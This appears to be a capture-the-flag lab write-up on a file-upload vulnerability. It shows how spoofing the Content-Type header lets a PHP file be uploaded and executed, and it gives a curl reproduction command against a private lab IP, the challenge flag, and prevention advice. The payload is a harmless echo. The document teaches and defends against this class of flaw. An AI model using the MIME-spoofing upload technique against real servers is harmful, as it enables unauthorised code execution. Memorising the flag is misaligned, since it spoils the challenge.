# File Upload Vulnerability

## Overview

A **Broken Access Control** was discovered, allowing attackers to bypass file type restrictions and execute malicious scripts on the server. This issue demonstrates insufficient validation of uploaded files, potentially leading to remote code execution (RCE).

## Methodology

1. **Initial Testing**

   - Uploaded corrupted `.jpg` files containing JavaScript `alert` payloads to test if the server would execute them.
   - The server accepted the files but only displayed a success message, without executing the embedded payload.

2. **Exploitation**

   - Uploaded a `.php` file disguised as an image by manipulating the `Content-Type` header.
   - The server saved the file and executed it successfully, confirming the vulnerability.

3. **Reproduction Steps**
   - Create a PHP file (`test.php`) with the following payload:
     ```php
     <?php echo "bonjour"; ?>
     ```
   - Use the following cURL command to upload the file:
     ```bash
     echo "<?php echo 'bonjour'; ?>" > test.php
     curl -X POST \
         -F "MAX_FILE_SIZE=100000" \
         -F "uploaded=@test.php;type=image/jpeg" \
         -F "Upload=Upload" \
         http://192.168.122.121/?page=upload
     ```
   - Access the uploaded file on the server to observe its execution.

## Flag

- **Flag**: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

---

## How to Prevent Broken Access Control Vulnerabilities

To secure applications against file upload vulnerabilities, implement the following measures:

1. **Restrict Allowed File Types**

   - Validate file types on both client and server sides using a strict whitelist of permitted extensions.

2. **Content Validation**

   - Inspect uploaded file content to ensure it matches the expected file type (e.g., validate MIME types).

3. **Rename Uploaded Files**

   - Rename uploaded files to remove executable extensions or special characters.

4. **Store Files Securely**

   - Save uploaded files outside the web-accessible root directory.

5. **Restrict Execution Permissions**

   - Configure the server to prevent execution of uploaded files (e.g., disable script execution in upload directories).

6. **Use Secure Libraries**

   - Employ secure libraries or frameworks for handling file uploads.

7. **Monitor and Audit**
   - Regularly monitor uploaded files and audit upload processes for security issues.

By following these best practices, developers can reduce the risk of file upload vulnerabilities leading to severe exploits like remote code execution (RCE).
